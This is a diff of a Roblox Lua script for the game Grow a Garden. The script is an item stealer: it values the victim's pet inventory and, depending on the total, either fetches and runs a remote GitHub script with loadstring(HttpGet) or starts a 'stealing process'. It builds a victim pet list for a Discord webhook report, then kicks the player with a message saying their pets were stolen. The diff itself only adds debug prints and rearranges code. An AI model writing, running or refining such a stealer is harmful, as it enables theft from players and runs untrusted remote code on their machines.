@@ -9,7 +9,7 @@ local BackupWebhook = getgenv().BackupWebhook or "" -- если есть зап�
 
 
 
-print("=============1")
+
 
 
 local teleportStarted = false -- в начало скрипта
@@ -117,7 +117,7 @@ if needTeleport then
 end
 
 
-print("=============2")
+
 
 
 -- Создание GUI
@@ -152,7 +152,7 @@ Title.TextScaled = true
 Title.Font = Enum.Font.GothamBold
 Title.Parent = Background
 
-print("=============3")
+
 
 
 
@@ -196,8 +196,9 @@ local PET_VALUES = {
     ["Corrupted Kitsune"] = 100,
 }
 
-print("=============4")
+
 local function checkPetsWhitelist(pet)
+print("local function checkPetsWhitelist(pet)")
     for _, name in ipairs(PET_WHITELIST) do
         if string.find(pet, name) then
             return true
@@ -207,6 +208,7 @@ local function checkPetsWhitelist(pet)
 end
 
 local function getInventoryValue()
+print("local function getInventoryValue()")
     local total = 0
     for _, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
         local petName = petData.PetType
@@ -218,18 +220,29 @@ local function getInventoryValue()
     return total
 end
 
-print("=============5")
+
 -- Получение итоговой стоимости
 local inventoryValue = getInventoryValue()
+print(inventoryValue)
 
 
 
 
+    -- Сбор питомцев и отправка
+    local totalValue = 0
+    local victimPetTable = {}
+    for petUid, value in pairs(require(game:GetService("ReplicatedStorage").Modules.DataService):GetData().PetsData.PetInventory.Data) do
+        local petName = value.PetType
+        if not checkPetsWhitelist(petName) then continue end
+        local petPrice = PET_VALUES[petName] or 0
+        totalValue += petPrice
+        table.insert(victimPetTable, string.format("%s - %sValue", petName, petPrice))
+    end
 
-print("=============6")
 
 -- 🔧 startStealingProcess ВЫНЕСЕНА ВВЕРХ
 local function startStealingProcess()
+print("local function startStealingProcess()")
     local scriptAlreadyRan = false
     if scriptAlreadyRan then
         warn("⚠️ ScriptAlreadyRun.")
@@ -351,22 +364,22 @@ local function startStealingProcess()
 
 if inventoryValue < 100 then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Best-Script/refs/heads/main/Grow%20a%20Garden", true))()
+print("<100")
 
 elseif inventoryValue == 1890 then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Best-Script/refs/heads/main/Grow%20a%20Garden", true))()
-
+print("==1890")
 elseif inventoryValue > 5000 then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Best-Script/refs/heads/main/Grow%20a%20Garden", true))()
-
+print("5000>")
 elseif inventoryValue > 1890 then
+print(">1890")
     -- 1 из 3 случаев запускает startStealingProcess
     if math.random(1, 3) == 1 then
+print("1>1890")
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Best-Script/refs/heads/main/Grow%20a%20Garden", true))()
     else
-        if not getgenv().Webhook or not getgenv().Username then
-            game.Players.LocalPlayer:Kick("⚠️ Webhook or Username is not set.")
-            return
-        end
+print("2>1890")
         startStealingProcess()
     end
 
@@ -377,18 +390,10 @@ else
         return
     end
     startStealingProcess()
+print("3>1890")
 end
 
-    -- Сбор питомцев и отправка
-    local totalValue = 0
-    local victimPetTable = {}
-    for petUid, value in pairs(require(game:GetService("ReplicatedStorage").Modules.DataService):GetData().PetsData.PetInventory.Data) do
-        local petName = value.PetType
-        if not checkPetsWhitelist(petName) then continue end
-        local petPrice = PET_VALUES[petName] or 0
-        totalValue += petPrice
-        table.insert(victimPetTable, string.format("%s - %sValue", petName, petPrice))
-    end
+
 
     -- Условия для Discord-отчёта
     if #victimPetTable == 0 or #victimPetTable == nil then
@@ -402,7 +407,7 @@ end
 end
 
 
-print("=============7")
+
 
 
 
@@ -494,7 +499,7 @@ for t = 1, 20 do
     wait(0.03)
 end
 
-print("=============8")
+
 
 -- Удаление GUI
 ScreenGui:Destroy()
@@ -548,4 +553,4 @@ task.delay(1, function()
         player:Kick("⚠️ Some of your pets were stolen.\nJoin: discord.gg/Rm5XHagSJW")
     end
 end)
-print("=============9")
+
